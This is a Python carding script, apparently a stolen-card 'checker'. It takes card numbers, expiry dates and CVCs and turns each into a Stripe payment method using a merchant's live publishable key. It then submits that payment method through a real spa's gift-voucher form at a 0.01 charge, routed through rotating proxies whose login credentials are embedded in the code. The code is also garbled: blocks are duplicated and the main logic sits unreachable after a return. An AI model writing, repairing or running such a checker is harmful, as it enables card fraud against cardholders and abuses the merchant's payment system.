import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	proxy_list = [
    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
]

# Function to randomly select a proxy
def get_random_proxy():
	proxy = random.choice(proxy_list)
	ip, port, username, password = proxy.split(":")
	proxy_auth = f"http://{username}:{password}@{ip}:{port}"
	return {"http": proxy_auth, "https": proxy_auth}
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51MyWZrJ52F9ZB0n07Hd0bDZxUwGNghNCcFDPnibONN3Wa9Vvj4yfQp3ZoA3WMGtuICDDH2nCezFYUFeJnhiwyXTw00gsD6iHLJ'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy, timeout=30)
	
	pm = r1.json()['id']
	
	proxy_list = [
    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
]

# Function to randomly select a proxy
def get_random_proxy():
	proxy = random.choice(proxy_list)
	ip, port, username, password = proxy.split(":")
	proxy_auth = f"http://{username}:{password}@{ip}:{port}"
	return {"http": proxy_auth, "https": proxy_auth}
	
	cookies = {
	    'cookielawinfo-checkbox-necessary': 'yes',
	    'cookielawinfo-checkbox-functional': 'yes',
	    'cookielawinfo-checkbox-performance': 'yes',
	    'cookielawinfo-checkbox-analytics': 'yes',
	    'cookielawinfo-checkbox-advertisement': 'yes',
	    'cookielawinfo-checkbox-others': 'yes',
	    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOnRydWUsInBlcmZvcm1hbmNlIjp0cnVlLCJhbmFseXRpY3MiOnRydWUsImFkdmVydGlzZW1lbnQiOnRydWUsIm90aGVycyI6dHJ1ZX0=',
	    'viewed_cookie_policy': 'yes',
	    '__stripe_mid': '60b9afb0-f87c-48df-9393-ecad8230aa35719248',
	    '__stripe_sid': '0fbefb30-5522-4013-9842-09221fb48b02050190',
	}
	
	headers = {
	    'authority': 'ornamentspa.eu',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOnRydWUsInBlcmZvcm1hbmNlIjp0cnVlLCJhbmFseXRpY3MiOnRydWUsImFkdmVydGlzZW1lbnQiOnRydWUsIm90aGVycyI6dHJ1ZX0=; viewed_cookie_policy=yes; __stripe_mid=60b9afb0-f87c-48df-9393-ecad8230aa35719248; __stripe_sid=0fbefb30-5522-4013-9842-09221fb48b02050190',
	    'origin': 'https://ornamentspa.eu',
	    'referer': 'https://ornamentspa.eu/ponudba/darilni-boni/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744595586276',
	}
	
	data = 'data=__fluent_form_embded_post_id%3D32%26_fluentform_5_fluentformnonce%3De4edf751cf%26_wp_http_referer%3D%252Fponudba%252Fdarilni-boni%252F%26names%255Bfirst_name%255D%3DRodam%2520User%26email%3Drodamuser08%2540gmail.com%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bzip%255D%3D1008%26input_text%3D0817480671%26input_radio%3DV%2520vrednosti%2520(%25E2%2582%25AC)%26numeric-field%3D20%26input_radio_1%3DPo%2520e-po%25C5%25A1ti%2520(natisne%25C5%25A1%2520ga%2520sam-a)%26terms-n-condition%3Don%26hidden%3D%26numeric-field_1%3D20%252C00%26input_radio_2%3DCredit%2520Card%2520(Stripe)%26payment_method%3Dstripe%26custom-payment-amount_2%3D0.01%26checkbox%255B%255D%3D%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=5'
	
	r2 = requests.post(
	    'https://ornamentspa.eu/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	    proxies=proxy,
	    timeout=30,
	)
	
	return (r2.json())
